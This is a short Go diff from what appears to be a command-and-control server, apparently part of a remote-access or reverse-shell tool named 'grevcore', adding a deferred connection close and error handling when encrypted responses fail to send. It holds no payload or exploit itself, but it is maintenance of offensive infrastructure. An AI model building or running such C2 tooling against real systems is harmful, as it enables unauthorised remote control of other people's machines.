@@ -45,6 +45,8 @@ func main() {
 			continue
 		}
 
+		defer conn.Close()
+
 		slog.Info("Incoming connection.", "REMOTE", conn.RemoteAddr())
 		key, err := grevcore.DeriveKey(conn, C2Password)
 
@@ -114,6 +116,14 @@ func ExecuteRequest(c net.Conn, key []byte) {
 			resp.Data = []byte("?")
 		}
 
-		grevcore.SendPacket(c, resp, key)
+		err = grevcore.SendPacket(c, resp, key)
+
+		if err != nil {
+			resp.Data = []byte("Packet Too Large.\n")
+			grevcore.SendPacket(c, resp, key)
+
+			slog.Error("An error occured while sending the response.", slog.Any("ERROR", err))
+			continue
+		}
 	}
 }
